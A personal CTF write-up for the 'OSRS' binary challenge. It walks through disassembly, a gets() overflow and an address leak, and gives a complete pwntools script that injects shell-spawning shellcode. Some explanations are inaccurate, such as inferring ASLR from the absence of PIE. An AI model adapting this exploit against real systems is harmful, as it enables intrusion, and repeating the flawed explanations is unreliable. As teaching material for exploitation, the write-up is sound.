# OSRS - Detailed Writeup

Category: Binary

First Written: 6.2.2020

Last Updated: 6.2.2020 

Introducing a new concept called **Salt Content** - where I talk about how salty this problem made me feel while doing it. 

I've not figured out the specifics of how I determine **salt content** yet, but just know that every problem I do from now on will have some salt content.

Salt Content: Quite Salty

As usual, try this problem on your own first. After a couple of hours, look at this writeup when you're totally stuck. No shame in learning something new!

## Topics Covered
- Shellcode
- Printf String Format Vulnerability
- NX
- ASLR

## Problem Description
```
My friend keeps talking about Old School RuneScape. He says he made a <a href="https://static.tjctf.org/7b612244a961b33b4c016a3fc142f9ad035ef6a070ba16f4a962ba2c09f2aaa1_osrs">service</a> to tell you about trees.

I don't know what any of this means but this system sure looks old! It has like zero security features enabled...

```

## Steps to pwn

*Note: I looked at another writeup and learned a lot from that one, in order to write my current writeup. You may see that the exploit looks very similar to the writeup that I will be linking at the bottom of this one. I'm not going to claim that I solved this problem completely on my own.* 

Let's run the program and see what's up. 

```
 ./osrs
Enter a tree type: 
aaaa
I don't have the tree -7924308 :(
```

The program asks for some input, and it seems that if your input doesn't match any tree types it can tell you about, we get the following line:

```
I don't have the tree -7924308 :(
```

The line includes a seemingly nonsensical negative number. 

What happens if we run the program again?

```
./osrs
Enter a tree type: 
aaaa
I don't have the tree -5511412 :(
```

This time, we get a different negative number. 

Let's run the **file** and **checksec** commands on this binary to gather some more information.

```
file osrs
osrs: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=d1fe30ddf26ddc33ca441a41efcaa9561d2f16d3, not stripped
```

```
checksec osrs
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Based off the output from **file** and **checksec**, we can deduce the following: 
- The file is a 32-bit executable, so we will be dealing with the 32-bit versions of registers like EBP, EIP, EAX, and so on. 
- The file **not stripped**, so all of the programmer-defined symbols are still in the binary (for example, function names are still present and not removed from the binary).
- ASLR (Address Space Layout Randomization) is enabled, meaning that various memory addresses, such as the location of libraries and the base pointer, will be randomized. We see this in the **checksec** output as there is no PIE (Position Indepent Executable). See the upcoming side note for another way to check for ASLR, though ASLR is often the default nowadays when compiling binaries. 
- NX is **disabled**, NX stands for Non-Executable. Thus, when NX is **enabled** some areas in memory are marked as non-executable, including the stack. When you see that NX is **disabled**, that's a hint that you should try throwing some shellcode into the binary to exploit it. 
- The binary has RWX segments, meaning there are segments you can read from, segments you can write to, and segments you can write to in the binary (a segment in a binary is literally what it sounds like, a segment is a chunk of the binary).

*Side note: You can also use ldd to further verify the presence of ASLR in a binary. ldd lets you view the address space of the binary. If the memory addresses change, you can safely say that ASLR is enabled.* 

```
ldd osrs
	linux-gate.so.1 (0xf7fcb000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dc4000)
	/lib/ld-linux.so.2 (0xf7fcc000)
ldd osrs
	linux-gate.so.1 (0xf7f50000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d49000)
	/lib/ld-linux.so.2 (0xf7f51000)
```
Now that we have done our initial recon, let's investigate further in radare. 

```
r2 -Ad ./osrs
s main
Vpp
```

Looking at the disassembly of the main, we see that there is a call to a function called get_tree. 

```
 0x08048612      e82fffffff     call sym.get_tree     
 ```

 Let's take a look at get_tree now. 

 ```
 s sym.get_tree
 ```

Disassembly of get_tree:
```
 sym.get_tree ();                                                                                                                                                                                                                                                          
│           ; var int32_t var_10ch @ ebp-0x10c                                                                                                                                                                                                                                   
│           ; var int32_t var_ch @ ebp-0xc                                                                                                                                                                                                                                       
│           0x08048546      55             push ebp                                                                                                                                                                                                                              
│           0x08048547      89e5           mov ebp, esp                                                                                                                                                                                                                          
│           0x08048549      81ec18010000   sub esp, 0x118                                                                                                                                                                                                                        
│           0x0804854f      83ec0c         sub esp, 0xc                                                                                                                                                                                                                          
│           0x08048552      68e88b0408     push str.Enter_a_tree_type:    ; 0x8048be8 ; "Enter a tree type: "                                                                                                                                                                    
│           0x08048557      e894feffff     call sym.imp.puts           ;[1] ; int puts(const char *s)                                                                                                                                                                            
│           0x0804855c      83c410         add esp, 0x10                                                                                                                                                                                                                         
│           0x0804855f      83ec0c         sub esp, 0xc                                                                                                                                                                                                                          
│           0x08048562      8d85f4feffff   lea eax, [var_10ch]                                                                                                                                                                                                                   
│           0x08048568      50             push eax                                                                                                                                                                                                                              
│           0x08048569      e872feffff     call sym.imp.gets           ;[2] ; char *gets(char *s)                                                                                                                                                                                
│           0x0804856e      83c410         add esp, 0x10                                                                                                                                                                                                                         
│           0x08048571      c745f4000000.  mov dword [var_ch], 0                                                                                                                                                                                                                 
│       ┌─< 0x08048578      eb2a           jmp 0x80485a4                                                                                                                                                                                                                         
│      ┌──> 0x0804857a      8b45f4         mov eax, dword [var_ch]                                                                                                                                                                                                               
│      ╎│   0x0804857d      8b04c5c09e04.  mov eax, dword [eax*8 + obj.trees]                                                                                                                                                                                                    
│      ╎│   0x08048584      83ec08         sub esp, 8                                                                                                                                                                                                                            
│      ╎│   0x08048587      8d95f4feffff   lea edx, [var_10ch]                                                                                                                                                                                                                   
│      ╎│   0x0804858d      52             push edx                                                                                                                                                                                                                              
│      ╎│   0x0804858e      50             push eax                                                                                                                                                                                                                              
│      ╎│   0x0804858f      e87cfeffff     call sym.imp.strcasecmp     ;[3] ; int strcasecmp(const char *s1, const char *s2)                                                                                                                                                     
│      ╎│   0x08048594      83c410         add esp, 0x10                                                                                                                                                                                                                         
│      ╎│   0x08048597      85c0           test eax, eax                                                                                                                                                                                                                         
│     ┌───< 0x08048599      7505           jne 0x80485a0                                                                                                                                                                                                                         
│     │╎│   0x0804859b      8b45f4         mov eax, dword [var_ch]                                                                                                                                                                                                               
│    ┌────< 0x0804859e      eb26           jmp 0x80485c6                                                                                                                                                                                                                         
│    │└───> 0x080485a0      8345f401       add dword [var_ch], 1                                                                                                                                                                                                                 
│    │ ╎│   ; CODE XREF from sym.get_tree @ 0x8048578                                                                                                                                                                                                                            
│    │ ╎└─> 0x080485a4      837df40c       cmp dword [var_ch], 0xc                                                                                                                                                                                                               
│    │ └──< 0x080485a8      7ed0           jle 0x804857a                                                                                                                                                                                                                         
│    │      0x080485aa      83ec08         sub esp, 8                                                                                                                                                                                                                            
│    │      0x080485ad      8d85f4feffff   lea eax, [var_10ch]                                                                                                                                                                                                                   
│    │      0x080485b3      50             push eax                                                                                                                                                                                                                              
│    │      0x080485b4      68fc8b0408     push str.I_don_t_have_the_tree__d_:    ; 0x8048bfc ; "I don't have the tree %d :(\n"                                                                                                                                                  
│    │      0x080485b9      e812feffff     call sym.imp.printf         ;[4] ; int printf(const char *format)                                                                                                                                                                     
│    │      0x080485be      83c410         add esp, 0x10                                                                                                                                                                                                                         
│    │      0x080485c1      b8ffffffff     mov eax, 0xffffffff         ; -1                                                                                                                                                                                                      
│    │      ; CODE XREF from sym.get_tree @ 0x804859e                                                                                                                                                                                                                            
│    └────> 0x080485c6      c9             leave                                                                                                                                                                                                                                 
└           0x080485c7      c3             ret                                                                                                                                                                                                                                   
            ; DATA XREFS from entry0 @ 0x8048456, 0x804845c                    
```

Looking at the disassembly here is are the most important tidbits we can discern:
- We see a call to gets -> gets is an infamously used function in CTF problems. Gets is very vulnerable to buffer overflow attacks. 
- Our input is stored in var_10ch.  
- There is a call to strcasecmp - the program checks to see if the input matches a pre-determined tree name. If the input does not match, then it calls printf with the string " "I don't have the tree %d :(\n" as its argument. 

Seeing a call to printf, with a %d inside, and knowing that we get a different, seemingly nonsensical number each time we run the program, could there be a string format vulnerability? 

Take a look at these key lines in the disassembly of get_tree:
```
 0x080485ad      8d85f4feffff   lea eax, [var_10ch]                                                                                                                                                                                                                   
│    │      0x080485b3      50             push eax                                                                                                                                                                                                                              
│    │      0x080485b4      68fc8b0408     push str.I_don_t_have_the_tree__d_:    ; 0x8048bfc ; "I don't have the tree %d :(\n"                                                                                                                                                  
│    │      0x080485b9      e812feffff     call sym.imp.printf         ;[4] ; int printf(const char *format)       
```

We see that the program loads the address of var_10ch (where we put our input) into eax, pushes that onto the stack, then pushes the "I don't have the tree %d" string onto the stack, and then calls printf. 

That nonsensical negative number is actually the address of var_10ch, where we put our input! 

So to spawn a shell and get our flag we can do the following: 
- Write shellcode into var_10ch
- Overwrite the return address of EIP, so that instead of going back to main, the function jumps to the location of var_10ch and executes the shellcode.

The only problem with this is that the address of var_10ch is leaked only after we send it some input. 

Here are some revised steps that will let us spawn a shell:
- Send var_10ch some input
- Get the address of var_10ch
- Run get_tree again by overwriting EIP to the address of get_tree when we initially send var_10ch some input
- In our second run of get_tree, send our shellcode, plus the address of var_10ch

The above steps should cause the shellcode stored in var_10ch to execute, spawning a shell and let us get the flag. 

Knowing this, let's write our exploit. 

```
from pwn import *

#get the address of get_tree
get_tree_addr = p32(ELF('./osrs').symbols['get_tree'])

offset = 0x10C + 4
#junk to fill up var_10ch, and then overwrite EBP (EBP takes up 4 bytes, which is why we add 4) 
junk = offset * "A"

#first input to send when we initially run get_tree
firstInput = junk + get_tree_addr

#start the process
r = process('./osrs')

#send firstInput after the intial prompt asking us for a tree
print(r.sendlineafter(': \n', firstInput))

#recieve up until the negative number in the output 
print(r.recvuntil('tree '))

#grab the negative number that tells us the address of var_10ch
recvInt = int(r.recvuntil(' '))

#convert the negative number we get its positive hex number representation using two's complement (I will write more about this later) 
var_10ch_addr = (1<<32) + recvInt

var_10ch_addr = p32(var_10ch_addr)

#craft our shellcode, pwntools has built in tools for this, in this case, we are using shellcode to spawn a shell 
shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')

#create our second input of our shellcode, with some padding at the end of it using .ljust, and the address of var_10ch where our shellcode is going to be in memory
secondInput = shellcode.ljust(offset) + var_10ch_addr

#send our secondInput
r.sendlineafter(': \n', secondInput)

#allow us to interact with the binary after we send the secondInput
r.interactive()

```

## Link to very awesome, original writeup 
https://ctftime.org/writeup/20754

## Unformatted resources for the brain because I'm tired and there's a lot of links I crawled through to understand and create this writeup
https://www.w3schools.com/python/ref_string_ljust.asp

https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/

https://stackoverflow.com/questions/47778099/what-is-no-pie-used-for

https://en.wikipedia.org/wiki/Executable_space_protection

https://www.interviewcake.com/concept/java/bit-shift

https://en.wikipedia.org/wiki/Two%27s_complement

https://wiki.python.org/moin/BitwiseOperators

https://stackoverflow.com/questions/22832615/what-do-and-mean-in-python

https://math.stackexchange.com/questions/408761/hexadecimal-value-of-a-negative-number#:~:text=3%20Answers&text=They%20are%20using%20two's%20complement,from%2015%2C%20then%20adding%201.

https://www.cs.nmsu.edu/~hdp/cs273/notes/neg.html

https://www.cs.virginia.edu/~evans/cs216/guides/x86.html

https://www.coengoedegebure.com/buffer-overflow-attacks-explained/

http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf

https://cs155.stanford.edu/papers/formatstring-1.2.pdf

https://www.lix.polytechnique.fr/~liberti/public/computing/prog/c/C/FUNCTIONS/format.html

http://mathforum.org/library/drmath/view/54344.html

http://mathforum.org/library/drmath/view/55998.html

https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf

https://0xrick.github.io/binary-exploitation/bof5/

### Author's thoughts on this problem
I came really, really close to solving this problem, but didn't quite get it. I tried to write into another segment in the binary and jump to that, but none of the segments are marked as both writeable and executable, so that was out. Many hours were poured into working on this problem, and before I finished the informational bits of the writeup (disregarding the fact that I need to format those links), when I wasn't actively working on the problem, I was thinking about it. It helps to let concepts simmer in your brain for a bit. 

Somedays I don't get to go as hard on pwning as other days, especially when "life gets in the way" as you would put it (there's more to life than just pwning those binaries all day yoyo). I find that it helps to **gain full control over your mind and feelings, as you will then feel a lot more powerful in what you can do.** 

What do I mean by this? I mean that, if you realize that you can control how you feel, and you stop letting so many external forces, such as what happens or what other people think, get in the way of your thoughts, then pwning, or rather, mastering any skill, becomes a heck of a lot easier. It's understandable that certain events can make you feel a certain way, but you have to learn to take control of your wandering thoughts, and focus. When your thoughts are all over the place, doing anything becomes much more daunting and less fun. Gaining control over your thoughts is like when Link finally gets the master sword, or when you finally get the pole vault in Animal Crossing. You feel powerful. 

There is a show on Netflix about *life things* called [The Midnight Gospel](https://en.wikipedia.org/wiki/The_Midnight_Gospel) that I have absolutely been enjoying recently. If you're looking for a show that will make you think about *life things*, then check it out!

For me, a problem does not feel truly complete until I have created a writeup that explains how to solve it. As I write my writeup, I try to think about what would be helpful for a total beginner, or at least, what would have been helpful to my past self when attempting the problem. I also make sure to double check my understanding of certain concepts (lots and lots of Google). Many times you won't know what to look for to solve a problem, and that's okay. Each writeup probably takes at minimum 1 hour, often more. Most writeups don't really explain, they just show you the solution. This is okay, I guess, but imagine taking a math class where nothing was explained to you, the instructor just gave you problems, and gave you the solutions, and then said "go solve these" without any explanation. That would be quite frustrating, so I hope my writeups help to make the topic less intimidating for beginners. 

My writeups aren't perfect. I find flaws in them once I leave them for a couple of days and come back. Please feel free to give me feedback as to what you think is easy to understand, and what I should work on. 



### TO-DO:
- Write about converting a negative number into hex using two's complement concepts, and link it in the appropriate spot
- Write about an exploration with arguments using printf, and link it in the appropriate spot
- Create the quick version of this writeup 
- Format the links (maybe I should write a script, this is getting painful)


